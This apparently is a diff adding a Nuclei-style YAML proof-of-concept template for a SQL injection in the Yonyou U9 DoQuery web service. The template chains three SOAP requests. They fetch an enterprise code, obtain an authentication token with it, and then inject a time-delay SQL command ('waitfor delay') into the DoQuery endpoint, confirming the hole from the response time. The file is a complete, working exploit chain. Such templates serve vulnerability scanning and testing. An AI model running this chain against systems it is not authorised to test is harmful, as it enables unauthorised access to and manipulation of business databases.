@@ -1,0 +1,106 @@
+id: poc-yaml-yongyou-u9-doquery-sqli
+info:
+  name: 用友U9 DoQuery SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1)+2}}"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: step-1
+    method: POST
+    path:
+      - "{{BaseURL}}/CS/Office/TransWebService.asmx"
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: "http://tempuri.org/GetEnterprise"
+    body: |
+      <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+      <soap:Header/>
+      <soap:Body>
+      <tem:GetEnterprise/>
+      </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"Code\":"
+    extractors:
+      - type: regex
+        name: code
+        group: 1
+        regex:
+          - "\"Code\":\"(?P<code>.*?)\","  
+
+  - id: step-2
+    method: POST
+    path:
+      - "{{BaseURL}}/CS/Office/TransWebService.asmx"
+    headers:
+      Content-Type: text/xml;charset=UTF-8
+      SOAPAction: "http://tempuri.org/GetToken"
+    body: |
+      <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+      <soap:Header/>
+      <soap:Body>
+      <tem:GetToken>
+         <tem:endId>{{code}}</tem:endId>
+      </tem:GetToken>
+      </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"Token\":"
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        regex:
+          - "\"Token\":\"(?P<token>.*?)\","  
+
+  - id: step-3
+    method: POST
+    path:
+      - "{{BaseURL}}/CS/Office/TransWebService.asmx"
+    headers:
+      Content-Type: text/xml;charset=UTF-8
+      SOAPAction: "http://tempuri.org/DoQuery"
+    body: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+      <DoQuery xmlns="http://tempuri.org/">
+      <token>{{token}}</token>
+      <command>select 1;waitfor delay '0:0:{{t1}}' --</command>
+      </DoQuery>
+      </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"Column1\":"
+          - "<Datas>"
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - "to_number(duration) > to_number(t1)"
+          - "to_number(duration) < to_number(t2)"
